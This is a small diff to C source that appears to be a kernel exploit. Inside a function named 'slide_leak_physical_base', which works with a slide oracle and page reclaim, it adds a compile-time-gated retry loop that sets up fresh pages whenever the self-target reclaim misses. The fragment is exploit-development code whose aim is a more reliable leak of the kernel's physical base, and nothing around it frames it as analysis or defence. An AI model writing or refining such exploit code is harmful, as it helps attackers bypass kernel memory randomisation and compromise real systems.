@@ -1409,6 +1409,16 @@ static int slide_leak_physical_base(void) {
             "expected=%016zx\n",
             self_target_mutated, slide_oracle_target,
             slide_oracle_parent);
+#if defined(APP_SLIDE_SELF_TARGET_RETRY) && \
+    APP_SLIDE_SELF_TARGET_RETRY
+    if (!self_target_mutated && fresh_attempt < fresh_page_attempts) {
+      pr_warning("p0 result-copy self-target reclaim miss fresh=%d/%d; "
+                 "retrying with a new upstream page setup\n",
+                 fresh_attempt, fresh_page_attempts);
+      fresh_attempt++;
+      continue;
+    }
+#endif
     pr_info("p0 result-copy self-target diagnostic complete\n");
     return 0;
 #endif
